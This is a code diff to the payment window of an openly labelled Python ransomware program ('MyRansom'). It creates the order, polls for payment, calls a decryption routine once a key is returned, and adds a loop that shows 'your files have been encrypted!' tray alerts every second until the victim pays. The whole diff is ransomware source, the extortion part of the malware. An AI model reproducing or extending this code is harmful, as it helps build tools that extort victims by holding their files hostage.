@@ -91,10 +91,14 @@ class Pay_window(QMainWindow, Ui_PayWindow):
         self.label_2.setScaledContents(True)    # 让图片自适应label大小
         self.label.setText(f'请支付{total_amount}元')
         self.print_logs(f'交易创建 订单号:{out_trade_no} 付款金额:{total_amount}')
+        self.tradeSucc = False
         self.tray.setIcon(QtGui.QIcon(CUR_PATH+'\\icon.png')) #设置系统托盘图标
         self.thread = threading.Thread(target=self.query_order, args=(self.out_trade_no,))
+        self.thread2 = threading.Thread(target=self.Activated)
         self.thread.setDaemon(True)
         self.thread.start()     
+        self.thread2.setDaemon(True)
+        self.thread2.start()  
 
     # 刷新二维码
     def btn_refresh(self):
@@ -110,12 +114,13 @@ class Pay_window(QMainWindow, Ui_PayWindow):
         # print('*'*60)
         self.listWidget.addItem(log)
 
-    def iconActivated(self,reason):
-        self.tray.showMessage(u"马哥勒索", '你的文件被加密了！', icon=1) 
-        time.sleep(1)
-        self.tray.showMessage(u"马哥勒索", '你的文件被加密了！', icon=2)
-        time.sleep(1)
-        self.tray.showMessage(u"马哥勒索", '你的文件被加密了！', icon=3) 
+    def Activated(self):
+        while not self.tradeSucc:
+            self.tray.showMessage(u"MyRansom", '你的文件被加密了！', icon=3)
+            time.sleep(1)
+        if self.tradeSucc:
+            self.tray.showMessage(u"MyRansom", '歪比歪比！你的文件完好无损！', icon=1) 
+
 
 
     # 查询订单支付情况
@@ -160,6 +165,7 @@ class Pay_window(QMainWindow, Ui_PayWindow):
                 # self.send_message(result)
                 if client.get_key(out_trade_no):
                     client.dec_file()
+                    self.tradeSucc = True
                     self.widget_3.setVisible(True)
                     return
                 else:
